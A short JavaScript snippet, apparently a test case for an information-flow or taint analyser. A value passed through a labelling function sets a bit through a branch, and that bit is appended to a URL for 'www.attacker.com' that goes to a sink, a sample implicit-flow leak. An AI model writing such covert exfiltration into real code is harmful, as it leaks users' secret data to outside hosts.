var i =  Math.floor((Math.random() * 10) + 1); 

var h = lbl(i);
var l; 

if (h > 5) {l=0;}
else {l=1;}

url = urll("www.attacker.com" + l);
sink('Sink', '', url);
